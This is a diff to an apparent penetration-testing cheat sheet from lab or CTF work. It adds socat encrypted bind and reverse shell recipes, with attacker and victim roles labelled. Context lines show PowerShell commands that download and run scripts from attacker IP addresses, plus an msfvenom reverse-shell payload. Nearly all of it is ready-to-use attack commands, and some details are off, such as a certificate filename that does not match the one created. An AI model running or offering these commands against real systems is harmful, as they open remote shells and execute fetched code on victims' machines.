@@ -18,6 +18,7 @@
 16. [SSH](#SSH)
 17. [Word Press](#word-press)
 18. [Reverse Shells](#reverse-shells)
+18. [Encrypted Shells](#reverse-shells)
 19. [RSA](#rsa)
 20. [SSL](#ssl)
 21. [Shell Shock](#shell-shock)
@@ -893,18 +894,6 @@ john id_rsa.hash --wordlist=<wordlist>
 wpscan --url https://brainfuck.htb --disable-tls-checks
 ```
 
-# Encrypted Bind Shell
-## Socat
-```
-# Create Cert and Key
-openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
-# Create .pem file
-cat bind_shell.key bind_shell.crt > bind_shell.pem
-# Setup Listener
-sudo socat OPENSSL-LISTEN:443,cert=bin_shell.pem,verify=0,fork EXEC:/bin/bash
-# Connect
-socat - OPENSSL:10.10.10.10:443,verify=0
-```
 
 # Reverse Shells
 ## Netcat
@@ -967,6 +956,30 @@ msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.16 LPORT=4444 -f raw > sh
 powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
 
 c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.22:8000/Invoke-PowerShellTcp.ps1')
+```
+
+# Encrypted Shells
+## Socat Bind Shell
+```
+# Create Cert and Key
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+# Create .pem file
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+# Setup Listener
+sudo socat OPENSSL-LISTEN:443,cert=bin_shell.pem,verify=0,fork EXEC:/bin/bash
+# Connect
+socat - OPENSSL:10.10.10.10:443,verify=0
+```
+## Socat Reverse Shell
+```
+# Create cert and key
+openssl req -newkey rsa:2048 -nodes -keyout rev_shell.key -x509 -days 111 -out rev_shell.crt
+# Create .pem
+cat rev_shell.key rev_shell.crt > rev_shell.pem
+# On Kali VM (attacker)
+sudo socat -d -d OPENSSL-LISTEN:443,cert=rev_shell.pem,verify=0,fork STDOUT
+# On Windows Client (victim)
+socat OPENSSL:192.168.119.223:443,verify=0 EXEC:'cmd.exe',pipes
 ```
 
 
